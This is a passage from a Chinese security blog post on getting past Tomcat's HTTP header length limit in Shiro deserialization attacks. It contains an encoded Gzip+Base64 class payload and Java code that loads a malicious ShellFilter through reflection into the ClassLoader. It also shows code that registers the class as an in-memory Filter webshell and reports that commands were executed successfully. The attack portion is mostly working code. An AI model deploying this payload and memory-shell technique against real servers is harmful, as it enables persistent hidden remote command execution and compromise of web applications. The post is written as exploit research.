class="string">&quot;H4sIAAAAAAAAAKVW3VcbVRD/3XzdELZ8BChES1urhVCg60fVNmmxSFuLpoAEqW2xuiwXsnSzG3Y3FLTa+n2O5/giT/4FPvuSip7j6ZMP/kk+qHNv0jSFFOox52Tu7tyZnd/8Zubu/vn3r78DOIVvEngGb3Fc5piM40wrQng7jndaEUaO40oCU5iWYiaBdzGbQBz5OObk+p4U81JcjeN96XAtjusJ3MCCFB9IcVOKD1vxEQyORQ6TY4khdtZyrGCMIZwemmeITLhLgqE9ZzliqlxcFN6csWiTJplzTcOeNzxL3teUkaBg+Qx6znSLeiD8QF/cLBm+rxeEsSQ8Wzg1xSk9XxC2fcmyA+FlyVEGZTiSzq0a68aG7gtv3RaBXjWYcJ1layUr8cRMdc1waC9LhsTFDVOUAst1fA5CFl9yqxYMN3YGyVfXWbFWJsjZJ+36JXqY2Lldi1swLEcBDPkmQ5cy0suBZet503AclWTMLQelciC5U9u24azo+cCzHImYe9X4DIf3xkfJeDUwxNg+aBmipsTG8OwewKnaFJ1hcIdNIQhK+mUSuyBEJASGnVTudqjjCJtFaq8D+cAwb10xSqpjVN8tc6xwFKptzmFRZ3OsEiFLFMpzN6mYebfsmYIQU8YdDZ1zUkbXcAj9DMefCjrDwNMh1nALNkNvIDakUdHOEo+eL4Jz5WB59LSGIojUzl115nA1lLCmwQO1XqChjHUJ8Tb1xsK4hg1savgYn2i4g08ZoOEz3GU4Nrrvj+Oehs/haPhCii/Rr+Er9BN3GobwNcPofxo7ovJRG04vrgqT2Olu1iTUkk27rD5jNI57tSxD/55dypB6Ym8+hrI6LDRfSmW5+uR0AwZtRQQzhmcUhcI8kN49ZkPNJq+NqkoHRyCcYG6zRGh6mnnOP6y20s6WncAqkm2CgtZvetKNAWpqOS1iQ9CxMLgPohnPNYXvZx+LVFMSTIo06dABQp7CKFJvPowmiXi0Qe596aYbMget7IsLwraKliJpD0g7Ti9eMPwpGgb1ZrhOOTnqpjvdlNMWAnvVq8ZoxDlD+7WNbEMdG9QUqSTvbKpo9LZU0bpsl/2CPMtsV7bL+f93hA/N4zmk6N1KpyK9aCO00hFC8jDd6bTSWCJ64j7Yz3QRwhGSMaVswVHIkVUG9JBjtDI8jxfISjq/quyx21FTjgermzVHeXUcAyQHayjS9B/CierDmEu6FtrZGn6AUCYy8gDhTDQVSUa2EQ0hE0vF/sBaKpqMbYOH8Bvi135BSypWQaKC1vvQkgcqaMvwFK+g/Ue0yrXjJ0STnZl4KrqNJL2Iuirorl2n4hX0NNFXcLB+1Ts6PLKNvjBkemGVXgZtJNspzQ5KshO9SBKZXZRYN8bQg1lK+iZpV9GHdSL9HtH+HVn8QIRLShYoxTHkMIwRcLI+jVGcpO8WSrtO0xYV5UVF4xZewsuKxC28Ql9IYYr7PbH+GlGl4Vu8Tv5RinYHZ+gpMUIHIjX8D30kxTmyHGc5znGMcbzBcZ5jnONNSDn+F3kMqnKFMKEKcaHeEsOqVE2qerShHVi9HS4qq0v/AoUaz2nHCQAA&quot;</span>;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">currentClassloader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//解码解压缩</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b64Decoder.decodeBuffer(classData));</span><br><span class="line">            <span class="type">GZIPInputStream</span> <span class="variable">ungzip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(in);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = ungzip.read(buffer)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] evilclassbyte = out.toByteArray();</span><br><span class="line">            <span class="comment">//将恶意的filter(即ShellFilter)，注册到JVM</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(currentClassloader, evilclassbyte, <span class="number">0</span>, evilclassbyte.length);</span><br><span class="line">            <span class="comment">//将ShellFilter类存入classes字段</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">classesField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredField(<span class="string">&quot;classes&quot;</span>);</span><br><span class="line">            classesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Vector</span> <span class="variable">classes</span> <span class="operator">=</span> (Vector) classesField.get(currentClassloader);</span><br><span class="line">            classes.add(<span class="number">0</span>, evilClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676616480464-f90e1a92-94d5-4113-88a3-f6b6507bfc95.png" alt="image.png"></p><p><strong>实例化并注册恶意filter</strong></p><p>写一个正常的Filter内存马，将正常获取注册恶意的filter，改为从classes字段中获取注册恶意的filter(不再贴完整代码)。</p><p>即，将正常Filter内存马中的下面代码：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterShell</span> <span class="variable">filterShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterShell</span>();</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filterShell);</span><br></pre></td></tr></table></figure></div><p>改为：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//恶意Filter类的类全名</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.test.bypass.headerlen.bypass4.ShellFilter&quot;</span>);</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter((Filter) evilClass.newInstance());</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676616936042-2f1294de-22ab-44bb-9af5-91962dbf87f1.png" alt="image.png"></p><p>传参执行命令，发现内存马注入成功，效果如下：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676617221955-5ccaf2d3-c9cb-4fcc-b3a9-602a858b2869.png" alt="image.png"></p><p>产生一个思考：除了Gzip压缩，还能采取什么方式来压缩？</p><p>经过查阅相关资料，还可以进行DEFLATE、bzip2、LZO、LZ4、Snappy等方式压缩，可参考：<a href="https://my.oschina.net/OutOfMemory/blog/805427%E8%BF%9B%E8%A1%8C%E5%85%B6%E4%BB%96%E5%8E%8B%E7%BC%A9%E6%96%B9%E5%BC%8F%E7%9A%84%E6%B5%8B%E8%AF%95%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E6%B5%8B%E8%AF%95%E3%80%82">https://my.oschina.net/OutOfMemory/blog/805427进行其他压缩方式的测试，这里不再测试。</a></p><p>至此，完成了通过<code>Gzip+Base64压缩编码类字节码</code>绕过Tomcat Header长度限制的分析和利用。</p><h4 id="2-2-4-小结"><a href="#2-2-4-小结" class="headerlink" title="2.2.4. 小结"></a>2.2.4. 小结</h4><p>从根本上来说，上面三种减少HTTP Header的size的思路，都包含了分离Payload，主要区别是：</p><ul><li><p>分离Payload+动态加载类字节码：将Payload在HTTP请求体中向目标站点发送</p></li><li><p>缩短Payload+分散发包：将Payload在Thread name中存储</p></li><li><p>Gzip+Base64压缩编码类字节码：将Payload的一部分添加到ClassLoader的classes字段</p></li></ul><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>本文主要是对Tomcat Header长度限制绕过方法的分析和实现，以及一些思考，较为基础，如有不当之处，敬请指出。</p><p><strong>Reference：</strong></p><p><a href="https://cloud.tencent.com/developer/article/1475881">https://cloud.tencent.com/developer/article/1475881</a></p><p><a href="https://www.jianshu.com/p/ab054620da64">https://www.jianshu.com/p/ab054620da64</a></p><p><a href="https://zhuanlan.zhihu.com/p/548516726">https://zhuanlan.zhihu.com/p/548516726</a></p><p><a href="https://blog.csdn.net/qq_25179481/article/details/104464842">https://blog.csdn.net/qq_25179481/article/details/104464842</a></p><p><a href="https://mp.weixin.qq.com/s/QJgAt2usAZ7xYxTo0kXZ7A">https://mp.weixin.qq.com/s/QJgAt2usAZ7xYxTo0kXZ7A</a></p><p><a href="https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw">https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw</a></p><p><a href="https://mp.weixin.qq.com/s/r32pX7ucl-X9JoXzAzIRmw">https://mp.weixin.qq.com/s/r32pX7ucl-X9JoXzAzIRmw</a></p><p><a href="https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/">https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/</a></p><p><a href="https://paper.seebug.org/1233/">https://paper.seebug.org/1233/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Bypass </tag>
            
            <tag> 框架漏洞 </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
